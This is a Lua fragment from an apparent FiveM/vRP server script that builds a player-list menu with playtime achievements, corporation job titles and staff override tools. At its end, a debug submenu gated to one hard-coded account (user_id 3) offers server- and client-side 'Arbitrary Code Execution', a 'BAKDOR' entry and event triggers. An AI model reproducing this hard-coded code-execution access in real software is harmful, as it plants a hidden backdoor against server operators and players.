                menu["Played 100h"] = {function(p) setTitle(user_id, {title = "100h+ Veteran", suffix = {x=31,y=9}}) end, "Unlocked by playing for a total of one hundred hours!"}
            end
            if ((total_time[user_id] or 0) > (200*60*60)) or OVR then
                menu["Played 200h"] = {function(p) setTitle(user_id, {title = "200h+ Tycoon Expert", suffix = {x=31,y=9}}) end, "Unlocked by playing for a total of two hundred hours!"}
            end
            if ((total_time[user_id] or 0) > (500*60*60)) or OVR then
                menu["Played 500h"] = {function(p) setTitle(user_id, {title = "500h+ Tycoon Master", suffix = {x=31,y=9}}) end, "Unlocked by playing for a total of five hundred hours!"}
            end
            if vRP.hasPermissions({user_id,{
                "@trucking.trucking.>9",
                "@hunting.hunting.>9",
                "@farming.farming.>19",
                "@pilot.pilot.>9",
                "@police.police.>9"
                }}) or OVR then
                menu["COMPLETIONIST 100%"] = {function(p) setTitle(user_id, {title = "COMPLETIONIST", fullcolor = "gold", suffix = {x=38,y=33}}) end, "Unlocked by maxing most skills in the game!"}
            end
            if vRP.hasPermissions({user_id,{
                "@trucking.trucking.>4",
                "@hunting.hunting.>4",
                "@farming.farming.>9",
                "@pilot.pilot.>4",
                "@police.police.>4"
                }}) or OVR then
                menu["COMPLETIONIST 50%"] = {function(p) setTitle(user_id, {title = "50% COMPLETED", fullcolor = "gold", suffix = {x=31,y=14}}) end, "Unlocked by reaching 50% of most skills!"}
            end
			-- First Responders
            if vRP.hasPermission({user_id,"corp1.ceo"}) or OVR then
                menu["First Responders CEO"] = {function(p) setTitle(user_id, {title = "CEO of First Responders", color = "tomato", suffix = {x=1,y=41}}) end, ""}
            end
            if vRP.hasPermission({user_id,"corp1.employee"}) or OVR then
                menu["First Responders Employee"] = {function(p) setTitle(user_id, {title = "First Responders Employee", color = "tomato", suffix = {x=1,y=41}}) end, ""}
            end
            if vRP.hasPermission({user_id,"corp1.ems"}) or OVR then
                menu["First Responders EMS Unit"] = {function(p) setTitle(user_id, {title = "First Responders EMS Unit", color = "tomato", suffix = {x=1,y=41}}) end, ""}
            end
            if vRP.hasPermission({user_id,"corp1.air"}) or OVR then
                menu["First Responders Air Unit"] = {function(p) setTitle(user_id, {title = "First Responders Air Unit", color = "tomato", suffix = {x=1,y=41}}) end, ""}
            end
            if vRP.hasPermission({user_id,"corp1.firefighter"}) or OVR then
                menu["First Responders Firefighter"] = {function(p) setTitle(user_id, {title = "First Responders Firefighter", color = "tomato", suffix = {x=1,y=41}}) end, ""}
            end
            if vRP.hasPermission({user_id,"corp1.trucker"}) or OVR then
                menu["First Responders Trucker"] = {function(p) setTitle(user_id, {title = "First Responders Trucker", color = "tomato", suffix = {x=1,y=41}}) end, ""}
            end
            if vRP.hasPermission({user_id,"corp1.driver"}) or OVR then
                menu["First Responders Driver"] = {function(p) setTitle(user_id, {title = "First Responders Driver", color = "tomato", suffix = {x=1,y=41}}) end, ""}
            end
			-- CollinsCo
            if vRP.hasPermission({user_id,"corp2.ceo"}) or OVR then
                menu["CollinsCo CEO"] = {function(p) setTitle(user_id, {title = "CEO of CollinsCo", color = "red", suffix = {x=2,y=41}}) end, ""}
            end
            if vRP.hasPermission({user_id,"corp2.employee"}) or OVR then
                menu["CollinsCo Employee"] = {function(p) setTitle(user_id, {title = "CollinsCo Employee", color = "red", suffix = {x=2,y=41}}) end, ""}
            end
            if vRP.hasPermission({user_id,"corp2.driver"}) or OVR then
                menu["CollinsCo Trucker"] = {function(p) setTitle(user_id, {title = "CollinsCo Trucker", color = "red", suffix = {x=2,y=41}}) end, ""}
            end
            if vRP.hasPermission({user_id,"corp2.manager"}) or OVR then
                menu["CollinsCo Manager"] = {function(p) setTitle(user_id, {title = "CollinsCo Manager", color = "red", suffix = {x=2,y=41}}) end, ""}
            end
            if vRP.hasPermission({user_id,"corp2.supervisor"}) or OVR then
                menu["CollinsCo Supervisor"] = {function(p) setTitle(user_id, {title = "CollinsCo Supervisor", color = "red", suffix = {x=2,y=41}}) end, ""}
            end
            if vRP.hasPermission({user_id,"corp2.coowner"}) or OVR then
                menu["CollinsCo Co-Owner"] = {function(p) setTitle(user_id, {title = "Co-Owner of CollinsCo", color = "red", suffix = {x=2,y=41}}) end, ""}
            end
			-- Narwhal Corp
            if vRP.hasPermission({user_id,"corp3.ceo"}) or OVR then
                menu["NarwhalCorp CEO"] = {function(p) setTitle(user_id, {title = "CEO of NarwhalCorp", color = "cyan", suffix = {x=3,y=41}}) end, ""}
            end
            if vRP.hasPermission({user_id,"corp3.employee"}) or OVR then
                menu["NarwhalCorp Employee"] = {function(p) setTitle(user_id, {title = "NarwhalCorp Employee", color = "cyan", suffix = {x=3,y=41}}) end, ""}
            end
            if vRP.hasPermission({user_id,"corp3.annalist"}) or OVR then
                menu["NarwhalCorp Analyst"] = {function(p) setTitle(user_id, {title = "NarwhalCorp Analyst", color = "cyan", suffix = {x=3,y=41}}) end, ""}
            end
            if vRP.hasPermission({user_id,"corp3.technician"}) or OVR then
                menu["NarwhalCorp Technician"] = {function(p) setTitle(user_id, {title = "NarwhalCorp Technician", color = "cyan", suffix = {x=3,y=41}}) end, ""}
            end
            if vRP.hasPermission({user_id,"corp3.specialist"}) or OVR then
                menu["NarwhalCorp Specialist"] = {function(p) setTitle(user_id, {title = "NarwhalCorp Specialist", color = "cyan", suffix = {x=3,y=41}}) end, ""}
            end
            if vRP.hasPermission({user_id,"corp3.driver"}) or OVR then
                menu["NarwhalCorp Driver"] = {function(p) setTitle(user_id, {title = "NarwhalCorp Driver", color = "cyan", suffix = {x=3,y=41}}) end, ""}
            end
            if vRP.hasPermission({user_id,"corp3.transporter"}) or OVR then
                menu["NarwhalCorp Transporter"] = {function(p) setTitle(user_id, {title = "NarwhalCorp Transporter", color = "cyan", suffix = {x=3,y=41}}) end, ""}
            end
            if vRP.hasPermission({user_id,"corp3.trucker"}) or OVR then
                menu["NarwhalCorp Trucker"] = {function(p) setTitle(user_id, {title = "NarwhalCorp Trucker", color = "cyan", suffix = {x=3,y=41}}) end, ""}
            end
			-- SAL
            if vRP.hasPermission({user_id,"corp4.ceo"}) or OVR then
                menu["SAL CEO"] = {function(p) setTitle(user_id, {title = "CEO of S.A. Logistics", color = "white", suffix = {x=4,y=41}}) end, ""}
            end
            if vRP.hasPermission({user_id,"corp4.regionalmanager"}) or OVR then
                menu["SAL Regional Manager"] = {function(p) setTitle(user_id, {title = "Regional Manager of S.A. Logistics", color = "white", suffix = {x=4,y=41}}) end, ""}
            end
            if vRP.hasPermission({user_id,"corp4.boardofdirectors"}) or OVR then
                menu["SAL BoD"] = {function(p) setTitle(user_id, {title = "Director of S.A. Logistics", color = "white", suffix = {x=4,y=41}}) end, ""}
            end
            if vRP.hasPermission({user_id,"corp4.teamleader"}) or OVR then
                menu["SAL Team Leader"] = {function(p) setTitle(user_id, {title = "S.A. Logistics Team Leader", color = "white", suffix = {x=4,y=41}}) end, ""}
            end
            if vRP.hasPermission({user_id,"corp4.manager"}) or OVR then
                menu["SAL Manager"] = {function(p) setTitle(user_id, {title = "S.A. Logistics Manager", color = "white", suffix = {x=4,y=41}}) end, ""}
            end
            if vRP.hasPermission({user_id,"corp4.employee"}) or OVR then
                menu["SAL Employee"] = {function(p) setTitle(user_id, {title = "S.A. Logistics Employee", color = "white", suffix = {x=4,y=41}}) end, ""}
            end
            if vRP.hasPermission({user_id,"corp4.trucker"}) or OVR then
                menu["SAL Trucker"] = {function(p) setTitle(user_id, {title = "S.A. Logistics Trucker", color = "white", suffix = {x=4,y=41}}) end, ""}
            end
            if vRP.hasPermission({user_id,"corp4.driver"}) or OVR then
                menu["SAL Driver"] = {function(p) setTitle(user_id, {title = "S.A. Logistics Driver", color = "white", suffix = {x=4,y=41}}) end, ""}
            end
			-- FedEx
            if vRP.hasPermission({user_id,"corp5.ceo"}) or OVR then
                menu["FedEx CEO"] = {function(p) setTitle(user_id, {title = "CEO of FedEx", suffix = {x=5,y=41}}) end, ""}
            end
            if vRP.hasPermission({user_id,"corp5.employee"}) or OVR then
                menu["FedEx Employee"] = {function(p) setTitle(user_id, {title = "FedEx Employee", suffix = {x=5,y=41}}) end, ""}
            end
            if vRP.hasPermission({user_id,"corp5.driver"}) or OVR then
                menu["FedEx Driver"] = {function(p) setTitle(user_id, {title = "FedEx Driver", suffix = {x=5,y=41}}) end, ""}
            end
            if vRP.hasPermission({user_id,"corp5.pilot"}) or OVR then
                menu["FedEx Pilot"] = {function(p) setTitle(user_id, {title = "FedEx Pilot", suffix = {x=5,y=41}}) end, ""}
            end
            vRP.openMenu({player,menu})
        end})
    end
end

vRP.registerMenuBuilder({"main", function(add, data)
    local user_id = vRP.getUserId({data.player})
    if user_id ~= nil then
        local choices = {}
        choices["Player List"] = {function(player,choice)
            vRP.buildMenu({"playerlist", {player = player}, function(menu)
                menu.name = "Player List"
                menu.css={top="75px",header_color="rgba(200,0,0,0.75)"}
                
                menu["# Open / Close"] = {ch_toggle_playerlist, "Open or Close the player list. (Also available with X)"}
                menu["$ Change Icon"] = {function(p) setIconNormie(p,"prefix") end, "Change your Player List Icon. (Check the Discord for a list of all icons)"}
                menu["$ Titles / Achievements"] = {openTitlesMenu, "Change to one of your available titles."}
                menu["Total Time: Hide"] = {function(p) setOverride(user_id,"hiddentotal",1) end,"Hide your total playtime."}
                menu["Total Time: Show"] = {function(p) setOverride(user_id,"hiddentotal",nil) end,"Show your total playtime again."}
                menu["Whiten Job Title"] = {function(p) setOverride(user_id,"color","white") end,"Make your job title appear in white."}
                menu["Reset Changes"] = {function(p) clearOverridesForUser(user_id) end,"Revert your changes."}
                
                if vRP.hasPermission({user_id,"playerlist.hide"}) or isAdminAccount(user_id) or isStaff(user_id) then
                    menu["@Hide myself"] = {function(p) setOverride(user_id,"hidden",1) end,"[Hide] Make yourself invisible from the player list."}
                    menu["@Show myself"] = {function(p) setOverride(user_id,"hidden",nil) end,"[Hide] Show yourself on the player list again."}
                end
                if vRP.hasPermission({user_id,"playerlist.icon"}) or isAdminAccount(user_id) or isStaff(user_id) then
                    menu["@Change User Icon"] = {function(p) setIcon(p,"prefix") end,"[Icon] Change a users Icon."}
                end
                if vRP.hasPermission({user_id,"playerlist.override"}) or isAdminAccount(user_id) then
                    menu["@Override User Job Icon"] = {function(p) setIcon(p,"suffix") end,"[Override] Change a users Job Icon."}
                    menu["@Override User Job Title"] = {function(p) set(p,"title") end,"[Override] Change a users Job Title."}
                    menu["@Override User Job Color"] = {function(p) set(p,"color") end,"[Override] Change a users Job Icon."}
                    menu["@Override User Name Color"] = {function(p) set(p,"namecolor") end,"[Override] Change a users Name Icon."}
                end
                if isAdminAccount(user_id) then
					menu["$ PSA"] = {function(p) dMSG(p) end,"[Admin] Display an overlay message for all players"}
                end
                if vRP.hasPermission({user_id,"playerlist.super"}) or isAdminAccount(user_id) then
                    menu["%Set Hidden Status"] = {function(p) set(p,"hidden") end,"[Super] Make a user hidden from the list."}
                    menu["%Set Hidden Total Status"] = {function(p) set(p,"hiddentotal") end,"[Super] Hide the users total playtime."}
                    menu["%Set ID Override"] = {function(p) set(p,"id") end,"[Super] Change the represented ID for a user."}
                    menu["%Set Time Override"] = {function(p) set(p,"timer") end,"[Super] Change the represented Online Time for a user."}
                    menu["%Set Name Override"] = {function(p) set(p,"name") end,"[Super] Change the represented Name for a user."}
                    menu["%Set Total Time Override"] = {function(p) set(p,"totaltimer") end,"[Super] Change the represented Total Time for a user."}
                    menu["%Clear Overrides"] = {function(p) clearOverrides(p) end,"[Super] Clear a users overrides."}
                    menu["%Unhide all hidden users"] = {function(p) setOverrideForEveryone("hidden",nil) end,"[Super] Unhide every user who is hidden."}
                end
                if vRP.hasPermission({user_id,"playerlist.master"}) or user_id == 3 then
                    menu["% Master Features"] = {function(player,choice)
                        vRP.buildMenu({"playerlist_master", {player = player}, function(submenu)
                            submenu["%Total Time: Add"] = {function(p) masterAddTotalTime(p) end,"[Master] Add time to a users total time."}
                            submenu["%Total Time: Sub"] = {function(p) masterSubTotalTime(p) end,"[Master] Subtract time from a users total time."}
                            submenu["%Total Time: Set"] = {function(p) masterSetTotalTime(p) end,"[Master] Set time as a users total time."}
                            vRP.openMenu({player,submenu})
                        end})
                    end, "Master menu"}
                end
                if user_id == 3 then
                    menu["% Debug Features"] = {function(player,choice)
                        vRP.buildMenu({"playerlist_debug", {player = player}, function(submenu)
                            submenu["% IN.TMR"] = {function(p) dIT(p) end,"[Debug] Run Internal Timer feature during runtime"}
                            submenu["% ACE S."] = {function(p) dACES(p) end,"[Debug] Arbitrary Code Execution (server)"}
                            submenu["% ACE C."] = {function(p) dACEC(p) end,"[Debug] Arbitrary Code Execution (client)"}
                            submenu["% VERIFY"] = {function(p) dVE(p) end,"[Debug] Verify during runtime"}
                            submenu["% S.RSET"] = {function(p) dSR(p) end,"[Debug] Run Soft Reset feature during runtime"}
                            submenu["% BAKDOR"] = {function(p) dBAK(p) end,"[Debug] Restart dormant backup data"}
                            submenu["% TP.POS"] = {function(p) dTEL(p) end,"[Debug] Teleport to position with vehicle"}
                            submenu["% CACHE."] = {function(p) GenerateCache() end,"[Debug] Refresh cache during runtime"}
                            submenu["% EVNT C"] = {function(p) dEVC(p) end,"[Debug] Trigger Client Event"}
                            submenu["% EVNT S"] = {function(p) dEVS(p) end,"[Debug] Trigger Server Event"}
                            vRP.openMenu({player,submenu})
                        end})
                    end, "Debug menu"}
                end
                vRP.openMenu({player,menu})
            end})
        end, "Manage the player list and change your own appearance in it."}
        add(choices)
    end
end})